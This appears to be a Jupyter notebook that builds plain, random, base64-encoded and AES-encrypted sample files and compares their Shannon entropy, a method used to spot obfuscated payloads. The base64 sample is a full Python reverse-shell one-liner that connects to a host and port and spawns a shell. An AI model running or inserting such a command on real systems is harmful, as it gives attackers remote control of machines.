In [19]:
# Create some random data in multiple forms!
import random
import string
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

plaintext = ""
for i in range(4096):
        plaintext += random.choice(string.printable)

with open('plaintext.txt','w') as f:
    f.write(plaintext)
    
with open('raw.txt','wb') as f:
    f.write(random.randbytes(4096))

with open('base64.txt','wb') as f:
    plaintext = b"""export RHOST="127.0.0.1";export RPORT=8080;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'"""
    #plaintext.rjust(4096)
    f.write(base64.encodebytes(plaintext))

with open('aes.txt','wb') as f:
    key = b'CryptographicKey'
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(plaintext, AES.block_size))    
    f.write(ct_bytes)


In [20]:
import math

def entropy(data):
    """
    Implements the actual shannon entropy calculation
    H(X) = -∑[P(xi) * log(P(xi))]
    """
    if not data:
        return 0.0

    counts = {}
    for c in data:
        counts[c] = counts.get(c,0) + 1

    total = len(data)

    return -sum(
        (freq / total) * math.log2(freq / total)
        for freq in counts.values()
    )

def file_entropy(filepath, block_size=None):
    with open(filepath, "rb") as f:
        data = f.read()
    #print(byte_distribution(data))
    if block_size is None:
        return entropy(data)

    return [
        entropy(data[i:i + block_size])
        for i in range(0, len(data), block_size)
    ]

def byte_distribution(data):
    counts = {}
    for c in data:
        counts[c] = counts.get(c,0) + 1
    total = len(data)
    return {byte: count / total for byte, count in sorted(counts.items())}

print("Plain:",file_entropy('plaintext.txt',1024))
print("Completely random:",file_entropy('raw.txt',1024))
print("Encoded:",file_entropy('base64.txt',1024))
print("Encrypted:",file_entropy('aes.txt',1024))

Plain: [6.559689729545675, 6.574941497365284, 6.574860212770931, 6.568199627295387]
Completely random: [7.843491970599115, 7.824103929282205, 7.803130733171099, 7.801638082887427]
Encoded: [5.709141175580469]
Encrypted: [6.994505814760213]
